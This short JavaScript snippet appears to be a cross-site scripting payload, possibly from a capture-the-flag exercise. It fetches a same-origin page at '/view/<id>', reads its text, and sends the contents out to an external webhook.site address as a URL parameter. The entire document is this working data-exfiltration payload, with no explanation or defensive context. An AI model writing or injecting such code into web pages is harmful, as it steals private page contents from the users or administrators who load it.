fetch("/view/93a5a46e-25ed-41fa-8812-b471afa1a1c9")
  .then(r => {return r.text()})
  .then((d) => {fetch("https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d)})
